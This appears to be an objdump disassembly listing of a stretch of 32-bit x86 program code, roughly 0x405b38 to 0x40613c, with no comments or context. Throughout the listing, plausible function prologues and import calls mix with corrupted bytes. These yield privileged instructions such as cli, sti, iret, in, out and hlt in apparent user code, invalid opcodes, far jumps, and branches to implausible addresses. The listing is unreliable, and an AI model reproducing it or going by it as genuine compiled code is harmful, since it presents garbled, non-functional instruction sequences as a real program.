  405b38:	a9 89 41 dd 8b       	test   $0x8bdd4189,%eax
  405b3d:	13 8b 4d e8 8b 42    	adc    0x428be84d(%ebx),%ecx
  405b43:	1c c7                	sbb    $0xc7,%al
  405b45:	d0 01                	rolb   $1,(%ecx)
  405b47:	00 00                	add    %al,(%eax)
  405b49:	00 00                	add    %al,(%eax)
  405b4b:	8b ab b8 01 00 00    	mov    0x1b8(%ebx),%ebp
  405b51:	00 c7                	add    %al,%bh
  405b53:	42                   	inc    %edx
  405b54:	99                   	cltd
  405b55:	00 00                	add    %al,(%eax)
  405b57:	00 00                	add    %al,(%eax)
  405b59:	8b 0b                	mov    (%ebx),%ecx
  405b5b:	89 41 99             	mov    %eax,-0x67(%ecx)
  405b5e:	02 13                	add    (%ebx),%dl
  405b60:	89 42 28             	mov    %eax,0x28(%edx)
  405b63:	8b 0b                	mov    (%ebx),%ecx
  405b65:	5b                   	pop    %ebx
  405b66:	cf                   	iret
  405b67:	41                   	inc    %ecx
  405b68:	2c 33                	sub    $0x33,%al
  405b6a:	c0 d4 c2             	rcl    $0xc2,%ah
  405b6d:	10 00                	adc    %al,(%eax)
  405b6f:	90                   	nop
  405b70:	fa                   	cli
  405b71:	8b ec                	mov    %esp,%ebp
  405b73:	56                   	push   %esi
  405b74:	8b 75 0f             	mov    0xf(%ebp),%esi
  405b77:	43                   	inc    %ebx
  405b78:	8b 46 48             	mov    0x48(%esi),%eax
  405b7b:	85 c0                	test   %eax,%eax
  405b7d:	75 a9                	jne    0x405b28
  405b7f:	91                   	xchg   %eax,%ecx
  405b80:	46                   	inc    %esi
  405b81:	20 80 38 00 75 4f    	and    %al,0x4f750038(%eax)
  405b87:	8b 4e 0c             	mov    0xc(%esi),%ecx
  405b8a:	8b 46 18             	mov    0x18(%esi),%eax
  405b8d:	3b c8                	cmp    %eax,%ecx
  405b8f:	c7 00 14 00 00 00    	movl   $0x14,(%eax)
  405b95:	00 7d 24             	add    %bh,0x24(%ebp)
  405b98:	fb                   	sti
  405b99:	39 1c 8b             	cmp    %ebx,(%ebx,%ecx,4)
  405b9c:	29 63 08             	sub    %esp,0x8(%ebx)
  405b9f:	46                   	inc    %esi
  405ba0:	1c 35                	sbb    $0x35,%al
  405ba2:	38 2d 75 40 8a 50    	cmp    %ch,0x508a4075
  405ba8:	01 40 84             	add    %eax,-0x7c(%eax)
  405bab:	d2 74 40 89          	shlb   %cl,-0x77(%eax,%eax,2)
  405baf:	46                   	inc    %esi
  405bb0:	20 8a 10 80 80 2d    	and    %cl,0x2d808010(%edx)
  405bb6:	75 1e                	jne    0x405bd6
  405bb8:	2a 89 22 0c c7 46    	sub    0x46c70c22(%ecx),%cl
  405bbe:	20 d4                	and    %dl,%ah
  405bc0:	fb                   	sti
  405bc1:	41                   	inc    %ecx
  405bc2:	00 8b 4d 10 11 46    	add    %cl,0x4611104d(%ebx)
  405bc8:	1b 5f 5e             	sbb    0x5e(%edi),%ebx
  405bcb:	88 dc                	mov    %bl,%ah
  405bcd:	b8 7e 11 5f 00       	mov    $0x5f117e,%eax
  405bd2:	5d                   	pop    %ebp
  405bd3:	c2 10 00             	ret    $0x10
  405bd6:	8b 56 20             	mov    0x20(%esi),%edx
  405bd9:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405bdc:	0f be 02             	movsbl (%edx),%eax
  405bdf:	42                   	inc    %edx
  405be0:	83 f8 9c             	cmp    $0xffffff9c,%eax
  405be3:	89 46 10             	mov    %eax,0x10(%esi)
  405be6:	89 56 20             	mov    %edx,0x20(%esi)
  405be9:	d6                   	salc
  405bea:	84 d0                	test   %dl,%al
  405bec:	ee                   	out    %al,(%dx)
  405bed:	00 00                	add    %al,(%eax)
  405bef:	50                   	push   %eax
  405bf0:	bc ff 15 7c c1       	mov    $0xc17c15ff,%esp
  405bf5:	40                   	inc    %eax
  405bf6:	00 83 8a 08 85 c0    	add    %al,-0x3f7af776(%ebx)
  405bfc:	0f 84 bd 00 18 6d    	je     0x6d585cbf
  405c02:	80 78 01 3a          	cmpb   $0x3a,0x1(%eax)
  405c06:	74 1a                	je     0x405c22
  405c08:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  405c0b:	c7 01 e8 00 2c 00    	movl   $0x2c00e8,(%ecx)
  405c11:	bc 56 20 80 3a       	mov    $0x3a802056,%esp
  405c16:	00 0f                	add    %cl,(%edi)
  405c18:	95                   	xchg   %eax,%ebp
  405c19:	19 00                	sbb    %eax,(%eax)
  405c1b:	00 00                	add    %al,(%eax)
  405c1d:	e9 8a 00 00 00       	jmp    0x405cac
  405c22:	20 46 20             	and    %al,0x20(%esi)
  405c25:	80 38 00             	cmpb   $0x0,(%eax)
  405c28:	74 07                	je     0x405c31
  405c2a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405c2d:	89 01                	mov    %eax,(%ecx)
  405c2f:	eb 74                	jmp    0x405ca5
  405c31:	85 56 0c             	test   %edx,0xc(%esi)
  405c34:	7d 4e                	jge    0x405c84
  405c36:	18 42 8b             	sbb    %al,-0x75(%edx)
  405c39:	5f                   	pop    %edi
  405c3a:	89 56 68             	mov    %edx,0x68(%esi)
  405c3d:	3b c8                	cmp    %eax,%ecx
  405c3f:	7f 59                	jg     0x405c9a
  405c41:	c7 46 20 d4 02 41 00 	movl   $0x4102d4,0x20(%esi)
  405c48:	37                   	aaa
  405c49:	07                   	pop    %es
  405c4a:	3c 06                	cmp    $0x6,%al
  405c4c:	75 13                	jne    0x405c61
  405c4e:	8b 1a                	mov    (%edx),%ebx
  405c50:	10 48 e8             	adc    %cl,-0x18(%eax)
  405c53:	1b ae 5c fe 45 b8    	sbb    -0x47ba01a4(%esi),%ebp
  405c59:	8c 11                	mov    %ss,(%ecx)
  405c5b:	a9 00 5d c2 2a       	test   $0x2ac25d00,%eax
  405c60:	00 8b 46 04 97 c0    	add    %cl,-0x3f68fbba(%ebx)
  405c66:	dc 1f                	fcompl (%edi)
  405c68:	8b d6                	mov    %esi,%edx
  405c6a:	1c cf                	sbb    $0xcf,%al
  405c6c:	1a 10                	sbb    (%eax),%dl
  405c6e:	51                   	push   %ecx
  405c6f:	8b 02                	mov    (%edx),%eax
  405c71:	fb                   	sti
  405c72:	4c                   	dec    %esp
  405c73:	09 0c 28             	or     %ecx,(%eax,%ebp,1)
  405c76:	00 8b 4e 08 50 99    	add    %cl,-0x66aff7b2(%ebx)
  405c7c:	e8 f3 40 00 51       	call   0x51409d74
  405c81:	ff 56 04             	call   *0x4(%esi)
  405c84:	83 c4 4f             	add    $0x4f,%esp
  405c87:	8b 4b ee             	mov    -0x12(%ebx),%ecx
  405c8a:	87 56 2c             	xchg   %edx,0x2c(%esi)
  405c8d:	5f                   	pop    %edi
  405c8e:	e2 88                	loop   0x405c18
  405c90:	10 b8 7c 11 01 00    	adc    %bh,0x1117c(%eax)
  405c96:	5d                   	pop    %ebp
  405c97:	c2 10 00             	ret    $0x10
  405c9a:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  405c9d:	3d 14 81 e4 45       	cmp    $0x45e48114,%eax
  405ca2:	03 89 10 7c 46 20    	add    0x20467c10(%ecx),%ecx
  405ca8:	d4 02                	aam    $0x2
  405caa:	ba 00 ff f6 0c       	mov    $0xcf6ff00,%edx
  405caf:	8b 55 b3             	mov    -0x4d(%ebp),%edx
  405cb2:	8a 4e 10             	mov    0x10(%esi),%cl
  405cb5:	5f                   	pop    %edi
  405cb6:	33 c0                	xor    %eax,%eax
  405cb8:	bb 0a 5e 5d c2       	mov    $0xc25d5e0a,%ebx
  405cbd:	10 00                	adc    %al,(%eax)
  405cbf:	83 7e 10 2d          	cmpl   $0x2d,0x10(%esi)
  405cc3:	0f 84 fa fe e9 ff    	je     0x2a5bc3
  405cc9:	8b 56 ed             	mov    -0x13(%esi),%edx
  405ccc:	87 3a                	xchg   %edi,(%edx)
  405cce:	00 75 1b             	add    %dh,0x1b(%ebp)
  405cd1:	ff 46 be             	incl   -0x42(%esi)
  405cd4:	1b 9a 88 85 c0 74    	sbb    0x74c08588(%edx),%ebx
  405cda:	24 0d                	and    $0xd,%al
  405cdc:	3f                   	aas
  405cdd:	3a 81 1f 8b f7 1c    	cmp    0x1cf78b1f(%ecx),%al
  405ce3:	8b 56 7b             	mov    0x7b(%esi),%edx
  405ce6:	50                   	push   %eax
  405ce7:	8b 11                	mov    (%ecx),%edx
  405ce9:	52                   	push   %edx
  405cea:	e8 91 48 00 00       	call   0x40a580
  405cef:	50                   	push   %eax
  405cf0:	8b 46 08             	mov    0x8(%esi),%eax
  405cf3:	68 cc f3 40 00       	push   $0x40f3cc
  405cf8:	50                   	push   %eax
  405cf9:	9a 56 04 83 c4 10 8b 	lcall  $0x8b10,$0xc4830456
  405d00:	3f                   	aas
  405d01:	10 8a 4e 10 04 b8    	adc    %cl,-0x47fbefb2(%edx)
  405d07:	7c 11                	jl     0x405d1a
  405d09:	01 00                	add    %eax,(%eax)
  405d0b:	88 0a                	mov    %cl,(%edx)
  405d0d:	5e                   	pop    %esi
  405d0e:	5d                   	pop    %ebp
  405d0f:	c2 96 00             	ret    $0x96
  405d12:	90                   	nop
  405d13:	90                   	nop
  405d14:	90                   	nop
  405d15:	90                   	nop
  405d16:	37                   	aaa
  405d17:	90                   	nop
  405d18:	90                   	nop
  405d19:	90                   	nop
  405d1a:	90                   	nop
  405d1b:	90                   	nop
  405d1c:	1d 90 90 c6 55       	sbb    $0x55c69090,%eax
  405d21:	8b ec                	mov    %esp,%ebp
  405d23:	51                   	push   %ecx
  405d24:	74 57                	je     0x405d7d
  405d26:	b1 ad                	mov    $0xad,%cl
  405d28:	34 00                	xor    $0x0,%al
  405d2a:	27                   	daa
  405d2b:	53                   	push   %ebx
  405d2c:	c0 0f 85             	rorb   $0x85,(%edi)
  405d2f:	fd                   	std
  405d30:	00 00                	add    %al,(%eax)
  405d32:	84 84 3d dc 08 7c 78 	test   %al,0x787c08dc(%ebp,%edi,1)
  405d39:	14 0f                	adc    $0xf,%al
  405d3b:	8c ee                	mov    %gs,%esi
  405d3d:	00 00                	add    %al,(%eax)
  405d3f:	00 a1 84 03 41 00    	add    %ah,0x410384(%ecx)
  405d45:	28 c0                	sub    %al,%al
  405d47:	0f 48 ee             	cmovs  %esi,%ebp
  405d4a:	37                   	aaa
  405d4b:	cf                   	iret
  405d4c:	42                   	inc    %edx
  405d4d:	c7                   	(bad)
  405d4e:	3b 84 03 41 00 01 00 	cmp    0x10041(%ebx,%eax,1),%eax
  405d55:	88 00                	mov    %al,(%eax)
  405d57:	ff aa 5c c0 40 00    	ljmp   *0x40c05c(%edx)
  405d5d:	8b f0                	mov    %eax,%esi
  405d5f:	85 59 74             	test   %ebx,0x74(%ecx)
  405d62:	50                   	push   %eax
  405d63:	a1 70 03 41 00       	mov    0x410370,%eax
  405d68:	b0 c0                	mov    $0xc0,%al
  405d6a:	75 1d                	jne    0x405d89
  405d6c:	50                   	push   %eax
  405d6d:	11 10                	adc    %edx,(%eax)
  405d6f:	f4                   	hlt
  405d70:	40                   	inc    %eax
  405d71:	00 6a 73             	add    %ch,0x73(%edx)
  405d74:	0a c7                	or     %bh,%al
  405d76:	4b                   	dec    %ebx
  405d77:	00 00                	add    %al,(%eax)
  405d79:	63 c4                	arpl   %eax,%esp
  405d7b:	0c c8                	or     $0xc8,%al
  405d7d:	ed                   	in     (%dx),%eax
  405d7e:	03 41 eb             	add    -0x15(%ecx),%eax
  405d81:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405d82:	c0 0f 84             	rorb   $0x84,(%edi)
  405d85:	af                   	scas   %es:(%edi),%eax
  405d86:	00 00                	add    %al,(%eax)
  405d88:	00 8d 4d fc 56 56    	add    %cl,0x5656fc4d(%ebp)
  405d8e:	ff d0                	call   *%eax
  405d90:	8b f0                	mov    %eax,%esi
  405d92:	85 88 74 1d 8b 55    	test   %ecx,0x558b1d74(%eax)
  405d98:	fc                   	cld
  405d99:	8b b1 0c 52 df 50    	mov    0x50df520c(%ecx),%esi
  405d9f:	cf                   	iret
  405da0:	2f                   	das
  405da1:	32 15 00 8b 4d 08    	xor    0x84d8b00,%dl
  405da7:	83 00 0c             	addl   $0xc,(%eax)
  405daa:	56                   	push   %esi
  405dab:	ec                   	in     (%dx),%al
  405dac:	0a ff                	or     %bh,%bh
  405dae:	15 58 c0 40 00       	adc    $0x40c058,%eax
  405db3:	53                   	push   %ebx
  405db4:	c0 15 54 ce 40 00 8b 	rclb   $0x8b,0x40ce54
  405dbb:	d8 6a ff             	fsubrs -0x1(%edx)
  405dbe:	aa                   	stos   %al,%es:(%edi)
  405dbf:	ff 15 24 c1 0c 00    	call   *0xcc124
  405dc5:	6a e8                	push   $0xffffffe8
  405dc7:	85 00                	test   %eax,(%eax)
  405dc9:	00 c7                	add    %al,%bh
  405dcb:	39 7d 10             	cmp    %edi,0x10(%ebp)
  405dce:	83 c4 0c             	add    $0xc,%esp
  405dd1:	85 90 74 2d 8d 34    	test   %edx,0x348d2d74(%eax)
  405dd7:	85 04 00             	test   %eax,(%eax,%eax,1)
  405dda:	00 00                	add    %al,(%eax)
  405ddc:	56                   	push   %esi
  405ddd:	ff 15 5c c1 40 00    	call   *0x40c15c
  405de3:	83 c4 04             	add    $0x4,%esp
  405de6:	89 07                	mov    %eax,(%edi)
  405de8:	ff 15 24 c1 40 00    	call   *0x40c124
  405dee:	8b 3f                	mov    (%edi),%edi
  405df0:	8b ce                	mov    %esi,%ecx
  405df2:	8b 30                	mov    (%eax),%esi
  405df4:	8b d1                	mov    %ecx,%edx
  405df6:	c1 e9 02             	shr    $0x2,%ecx
  405df9:	35 24 8b 97 83       	xor    $0x83978b24,%eax
  405dfe:	e1 db                	loope  0x405ddb
  405e00:	aa                   	stos   %al,%es:(%edi)
  405e01:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405e02:	53                   	push   %ebx
  405e03:	ff 15 50 c0 40 00    	call   *0x40c050
  405e09:	8b 35 28 c1 40 00    	mov    0x40c128,%esi
  405e0f:	ff d6                	call   *%esi
  405e11:	8b 08                	mov    (%eax),%ecx
  405e13:	5b                   	pop    %ebx
  405e14:	85 c9                	test   %ecx,%ecx
  405e16:	74 16                	je     0x405e2e
  405e18:	ff d6                	call   *%esi
  405e1a:	8b 38                	mov    (%eax),%edi
  405e1c:	ff d6                	call   *%esi
  405e1e:	57                   	push   %edi
  405e1f:	c7 00 15 00 00 00    	movl   $0x15,(%eax)
  405e25:	ff 15 30 c1 40 00    	call   *0x40c130
  405e2b:	83 c4 04             	add    $0x4,%esp
  405e2e:	33 c0                	xor    %eax,%eax
  405e30:	5f                   	pop    %edi
  405e31:	68 8b ec 8d c2       	push   $0xc28dec8b
  405e36:	0c 00                	or     $0x0,%al
  405e38:	be 01 ff ff 4c       	mov    $0x4cffff01,%esi
  405e3d:	c0 40 00 e9          	rolb   $0xe9,0x0(%eax)
  405e41:	f4                   	hlt
  405e42:	ff                   	(bad)
  405e43:	ff                   	(bad)
  405e44:	ff 90 88 90 90 90    	call   *-0x6f6f6f78(%eax)
  405e4a:	af                   	scas   %es:(%edi),%eax
  405e4b:	90                   	nop
  405e4c:	90                   	nop
  405e4d:	90                   	nop
  405e4e:	90                   	nop
  405e4f:	1b 55 8b             	sbb    -0x75(%ebp),%edx
  405e52:	a8 51                	test   $0x51,%al
  405e54:	8b 45 0c             	mov    0xc(%ebp),%eax
  405e57:	5f                   	pop    %edi
  405e58:	81 5d 10 8f 85 db 57 	sbbl   $0x57db858f,0x10(%ebp)
  405e5f:	9f                   	lahf
  405e60:	18 bb 01 00 00 00    	sbb    %bh,0x1(%ebx)
  405e66:	66 83 38 00          	cmpw   $0x0,(%eax)
  405e6a:	75 e8                	jne    0x405e54
  405e6c:	66 83 78 02 dd       	cmpw   $0xffdd,0x2(%eax)
  405e71:	74 06                	je     0x405e79
  405e73:	d2 83 c0 02 eb ed    	rolb   %cl,-0x1214fd40(%ebx)
  405e79:	2b 45 90             	sub    -0x70(%ebp),%eax
  405e7c:	2b 9a 02 d1 f8 89    	sub    -0x76072efe(%edx),%ebx
  405e82:	45                   	inc    %ebp
  405e83:	10 8d 04 1d f3 00    	adc    %cl,0xf31d04(%ebp)
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	50                   	push   %eax
  405e8c:	ff 15 5c c1 47 f3    	call   *0xf347c15c
  405e92:	8b f8                	mov    %eax,%edi
  405e94:	8b 45 10             	mov    0x10(%ebp),%eax
  405e97:	5b                   	pop    %ebx
  405e98:	74 40                	je     0x405eda
  405e9a:	01 56 89             	add    %edx,-0x77(%esi)
  405e9d:	75 fc                	jne    0x405e9b
  405e9f:	ff d3                	call   *%ebx
  405ea1:	5c                   	pop    %esp
  405ea2:	3e 80 0a 83          	orb    $0x83,%ds:(%edx)
  405ea6:	c4 08                	les    (%eax),%ecx
  405ea8:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405eab:	89 07                	mov    %eax,(%edi)
  405ead:	8d 55 10             	lea    0x10(%ebp),%edx
  405eb0:	51                   	push   %ecx
  405eb1:	50                   	push   %eax
  405eb2:	8b 0c 0c             	mov    (%esp,%ecx,1),%ecx
  405eb5:	52                   	push   %edx
  405eb6:	50                   	push   %eax
  405eb7:	e8 34 b0 90 6d       	call   0x6dd10ef0
  405ebc:	8b 65 fc             	mov    -0x4(%ebp),%esp
  405ebf:	d0 07                	rolb   $1,(%edi)
  405ec1:	2b c1                	sub    %ecx,%eax
  405ec3:	4c                   	dec    %esp
  405ec4:	50                   	push   %eax
  405ec5:	ff 15 20 c1 40 73    	call   *0x7340c120
  405ecb:	b9 01 00 00 00       	mov    $0x1,%ecx
  405ed0:	83 c4 08             	add    $0x8,%esp
  405ed3:	3b d9                	cmp    %ecx,%ebx
  405ed5:	89 07                	mov    %eax,(%edi)
  405ed7:	81 29 32 4b ff 8d    	subl   $0x8dff4b32,(%ecx)
  405edd:	47                   	inc    %edi
  405ede:	04 89                	add    $0x89,%al
  405ee0:	4d                   	dec    %ebp
  405ee1:	0c a8                	or     $0xa8,%al
  405ee3:	22 50 fc             	and    -0x4(%eax),%dl
  405ee6:	83 c2 02             	add    $0x2,%edx
  405ee9:	89 10                	mov    %edx,(%eax)
  405eeb:	8b 30                	mov    (%eax),%esi
  405eed:	fb                   	sti
  405eee:	43                   	inc    %ebx
  405eef:	46                   	inc    %esi
  405ef0:	84 d2                	test   %dl,%dl
  405ef2:	89 5e 75             	mov    %ebx,0x75(%esi)
  405ef5:	f5                   	cmc
  405ef6:	8b 04 0c             	mov    (%esp,%ecx,1),%eax
  405ef9:	83 c0 04             	add    $0x4,%eax
  405efc:	4a                   	dec    %edx
  405efd:	89 55 0c             	mov    %edx,0xc(%ebp)
  405f00:	75 e1                	jne    0x405ee3
  405f02:	8b 45 b0             	mov    -0x50(%ebp),%eax
  405f05:	c7 04 8f 00 00 00 00 	movl   $0x0,(%edi,%ecx,4)
  405f0c:	89 37                	mov    %esi,(%edi)
  405f0e:	5f                   	pop    %edi
  405f0f:	8b c3                	mov    %ebx,%eax
  405f11:	5e                   	pop    %esi
  405f12:	a1 8b e5 5d c3       	mov    0xc35de58b,%eax
  405f17:	90                   	nop
  405f18:	90                   	nop
  405f19:	90                   	nop
  405f1a:	90                   	nop
  405f1b:	90                   	nop
  405f1c:	90                   	nop
  405f1d:	90                   	nop
  405f1e:	90                   	nop
  405f1f:	90                   	nop
  405f20:	b2 8d                	mov    $0x8d,%dl
  405f22:	ec                   	in     (%dx),%al
  405f23:	81 ec 98 01 00 00    	sub    $0x198,%esp
  405f29:	a1 88 9b 41 00       	mov    0x419b88,%eax
  405f2e:	88 c8                	mov    %cl,%al
  405f30:	40                   	inc    %eax
  405f31:	2e 98                	cs cwtl
  405f33:	a3 88 03 41 00       	mov    %eax,0x410388
  405f38:	74 08                	je     0x405f42
  405f3a:	b4 c0                	mov    $0xc0,%ah
  405f3c:	8b e5                	mov    %ebp,%esp
  405f3e:	69 c3 63 55 f8 52    	imul   $0x52f85563,%ebx,%eax
  405f44:	e8 d7 47 00 00       	call   0x40a720
  405f49:	83 c4 04             	add    $0x4,%esp
  405f4c:	9e                   	sahf
  405f4d:	c0 a9 85 82 00 00 2a 	shrb   $0x2a,0x8285(%ecx)
  405f54:	ff 15 60 c0 40 ee    	call   *0xee40c060
  405f5a:	a3 54 57 41 00       	mov    %eax,0x415754
  405f5f:	e8 dc e9 ff ff       	call   0x404940
  405f64:	fd                   	std
  405f65:	c0 75 73 50          	shlb   $0x50,0x73(%ebp)
  405f69:	50                   	push   %eax
  405f6a:	50                   	push   %eax
  405f6b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405f6e:	9b                   	fwait
  405f6f:	17                   	pop    %ss
  405f70:	ec                   	in     (%dx),%al
  405f71:	ef                   	out    %eax,(%dx)
  405f72:	ff 08                	decl   (%eax)
  405f74:	85 99 c4 09 b8 22    	test   %ebx,0x22b809c4(%ecx)
  405f7a:	4e                   	dec    %esi
  405f7b:	00 00                	add    %al,(%eax)
  405f7d:	8b 48 5d             	mov    0x5d(%eax),%ecx
  405f80:	c3                   	ret
  405f81:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405f84:	68 24 7f 40 00       	push   $0x407f24
  405f89:	51                   	push   %ecx
  405f8a:	bf 61 f6 ff ff       	mov    $0xfffff661,%edi
  405f8f:	8d 95 68 fe ff ff    	lea    -0x198(%ebp),%edx
  405f95:	52                   	push   %edx
  405f96:	6a 02                	push   $0x2
  405f98:	ff 35 d0 cf 26 00    	push   0x26cfd0
  405f9e:	85 ab 0d 39 66 8b    	test   %ebp,-0x7499c6f3(%ebx)
  405fa4:	85 68 c3             	test   %ebp,-0x3d(%eax)
  405fa7:	ff                   	(bad)
  405fa8:	ff                   	(bad)
  405fa9:	3c 02                	cmp    $0x2,%al
  405fab:	75 23                	jne    0x405fd0
  405fad:	f7 c9 4b cc d4 c9    	test   $0xc9d4cc4b,%ecx
  405fb3:	75 1b                	jne    0x405fd0
  405fb5:	91                   	xchg   %eax,%ecx
  405fb6:	55                   	push   %ebp
  405fb7:	fc                   	cld
  405fb8:	52                   	push   %edx
  405fb9:	5d                   	pop    %ebp
  405fba:	62 44 00 00          	bound  %eax,0x0(%eax,%eax,1)
  405fbe:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405fc1:	50                   	push   %eax
  405fc2:	e8 69 44 00 00       	call   0x40a430
  405fc7:	83 c4 08             	add    $0x8,%esp
  405fca:	33 c0                	xor    %eax,%eax
  405fcc:	5c                   	pop    %esp
  405fcd:	e5 5d                	in     $0x5d,%eax
  405fcf:	c3                   	ret
  405fd0:	ff 15 db c1 40 00    	call   *0x40c1db
  405fd6:	b8 11 00 00 fc       	mov    $0xfc000011,%eax
  405fdb:	8b e5                	mov    %ebp,%esp
  405fdd:	b6 c3                	mov    $0xc3,%dh
  405fdf:	90                   	nop
  405fe0:	a1 88 03 41 aa       	mov    0xaa410388,%eax
  405fe5:	48                   	dec    %eax
  405fe6:	74 88                	je     0x405f70
  405fe8:	03 41 00             	add    0x0(%ecx),%eax
  405feb:	9d                   	popf
  405fec:	b6 e8                	mov    $0xe8,%dh
  405fee:	2e ea ff ff 6b 15 3f 	cs ljmp $0xc13f,$0x156bffff
  405ff5:	c1 
  405ff6:	40                   	inc    %eax
  405ff7:	00 a1 54 09 41 00    	add    %ah,0x410954(%ecx)
  405ffd:	50                   	push   %eax
  405ffe:	92                   	xchg   %eax,%edx
  405fff:	15 0f c0 40 00       	adc    $0x40c00f,%eax
  406004:	c3                   	ret
  406005:	90                   	nop
  406006:	90                   	nop
  406007:	90                   	nop
  406008:	41                   	inc    %ecx
  406009:	90                   	nop
  40600a:	90                   	nop
  40600b:	90                   	nop
  40600c:	9a 1e 0d 90 3d 8b c7 	lcall  $0xc78b,$0x3d900d1e
  406013:	8a 45 14             	mov    0x14(%ebp),%al
  406016:	57                   	push   %edi
  406017:	9a 62 74 13 8b 45 08 	lcall  $0x845,$0x8b137462
  40601e:	51                   	push   %ecx
  40601f:	c7                   	(bad)
  406020:	51                   	push   %ecx
  406021:	1d 00 da 00 b8       	sbb    $0xb800da00,%eax
  406026:	87 e3                	xchg   %esp,%ebx
  406028:	01 60 5d             	add    %esp,0x5d(%eax)
  40602b:	c2 10 00             	ret    $0x10
  40602e:	39 60 0c             	cmp    %esp,0xc(%eax)
  406031:	81 ff 00 0f 00 00    	cmp    $0xf00,%edi
  406037:	76 13                	jbe    0x40604c
  406039:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40603c:	b8 25 00 00 a3       	mov    $0xa3000025,%eax
  406041:	ea c7 01 93 00 00 00 	ljmp   $0x0,$0x9301c7
  406048:	5d                   	pop    %ebp
  406049:	c2 10 df             	ret    $0xdf10
  40604c:	b2 8b                	mov    $0x8b,%dl
  40604e:	5d                   	pop    %ebp
  40604f:	10 56 08             	adc    %dl,0x8(%esi)
  406052:	d3 30                	shll   %cl,(%eax)
  406054:	00 00                	add    %al,(%eax)
  406056:	53                   	push   %ebx
  406057:	e8 d7 ea ff ff       	call   0x404b33
  40605c:	8b 75 08             	mov    0x8(%ebp),%esi
  40605f:	33 c9                	xor    %ecx,%ecx
  406061:	89 e3                	mov    %esp,%ebx
  406063:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406064:	48                   	dec    %eax
  406065:	1a da                	sbb    %dl,%bl
  406067:	16                   	push   %ss
  406068:	89 55 cc             	mov    %edx,-0x34(%ebp)
  40606b:	8b 06                	mov    (%esi),%eax
  40606d:	8d 3c bf             	lea    (%edi,%edi,4),%edi
  406070:	89 18                	mov    %ebx,(%eax)
  406072:	8b 16                	mov    (%esi),%edx
  406074:	5e                   	pop    %esi
  406075:	e7 02                	out    %eax,$0x2
  406077:	53                   	push   %ebx
  406078:	07                   	pop    %es
  406079:	0c 8b                	or     $0x8b,%al
  40607b:	06                   	push   %es
  40607c:	57                   	push   %edi
  40607d:	53                   	push   %ebx
  40607e:	89 88 10 10 00 39    	mov    %ecx,0x39001010(%eax)
  406084:	8b 42 a3             	mov    -0x5d(%edx),%eax
  406087:	8a 6b 20             	mov    0x20(%ebx),%ch
  40608a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40608b:	68 8b 13 89 88       	push   $0x8889138b
  406090:	18 b9 73 00 e8 c7    	sbb    %bh,-0x3817ff8d(%ecx)
  406096:	e9 ff ff 8b c4       	jmp    0xc4cc609a
  40609b:	57                   	push   %edi
  40609c:	53                   	push   %ebx
  40609d:	29 81 1c 91 95 00    	sub    %eax,0x95911c(%ecx)
  4060a3:	e8 b8 e9 ff ff       	call   0x404a60
  4060a8:	8b 8e 5e 5b ad 48    	mov    0x48ad5b5e(%esi),%ecx
  4060ae:	82 d8 30             	sbb    $0x30,%al
  4060b1:	71 00                	jno    0x4060b3
  4060b3:	33 60 5d             	xor    0x5d(%eax),%esp
  4060b6:	46                   	inc    %esi
  4060b7:	10 00                	adc    %al,(%eax)
  4060b9:	90                   	nop
  4060ba:	ea 90 90 90 90 90 55 	ljmp   $0x5590,$0x90909090
  4060c1:	8b 73 8b             	mov    -0x75(%ebx),%esi
  4060c4:	45                   	inc    %ebp
  4060c5:	08 53 c5             	or     %dl,-0x3b(%ebx)
  4060c8:	57                   	push   %edi
  4060c9:	8b 48 04             	mov    0x4(%eax),%ecx
  4060cc:	8b 50 99             	mov    -0x67(%eax),%edx
  4060cf:	3b ca                	cmp    %edx,%ecx
  4060d1:	75 68                	jne    0x40613b
  4060d3:	5f                   	pop    %edi
  4060d4:	5e                   	pop    %esi
  4060d5:	47                   	inc    %edi
  4060d6:	34 00                	xor    $0x0,%al
  4060d8:	00 00                	add    %al,(%eax)
  4060da:	5b                   	pop    %ebx
  4060db:	5d                   	pop    %ebp
  4060dc:	c2 08 29             	ret    $0x2908
  4060df:	8b 90 1c 30 00 00    	mov    0x301c(%eax),%edx
  4060e5:	31 5d 0c             	xor    %ebx,0xc(%ebp)
  4060e8:	8d 0c 89             	lea    (%ecx,%ecx,4),%ecx
  4060eb:	8b f3                	mov    %ebx,%esi
  4060ed:	8d 3c 8a             	lea    (%edx,%ecx,4),%edi
  4060f0:	ff 05 00 00 00 f3    	incl   0xf3000000
  4060f6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4060f7:	7a a7                	jp     0x4060a0
  4060f9:	04 b9                	add    $0xb9,%al
  4060fb:	23 00                	and    (%eax),%eax
  4060fd:	00 00                	add    %al,(%eax)
  4060ff:	3b d1                	cmp    %ecx,%edx
  406101:	0f 06                	clts
  406103:	e2 00                	loop   0x406105
  406105:	04 00                	add    $0x0,%al
  406107:	8b 53 0c             	mov    0xc(%ebx),%edx
  40610a:	8b 7a 04             	mov    0x4(%edx),%edi
  40610d:	d6                   	salc
  40610e:	53                   	push   %ebx
  40610f:	08 84 d1 74 2f 8b 50 	or     %al,0x508b2f74(%ecx,%edx,8)
  406116:	0c 33                	or     $0x33,%al
  406118:	c9                   	leave
  406119:	85 d2                	test   %edx,%edx
  40611b:	8d 0f                	lea    (%edi),%ecx
  40611d:	8d 70 10             	lea    0x10(%eax),%esi
  406120:	43                   	inc    %ebx
  406121:	3e 74 8d             	je,pt  0x4060b1
  406124:	41                   	inc    %ecx
  406125:	83 c6 04             	add    $0x4,%esi
  406128:	3b ca                	cmp    %edx,%ecx
  40612a:	72 f4                	jb     0x406120
  40612c:	55                   	push   %ebp
  40612d:	ca 75 13             	lret   $0x1375
  406130:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  406136:	73 0b                	jae    0x406143
  406138:	89 7c 05 10          	mov    %edi,0x10(%ebp,%eax,1)
  40613c:	8b 48 8b             	mov    -0x75(%eax),%ecx
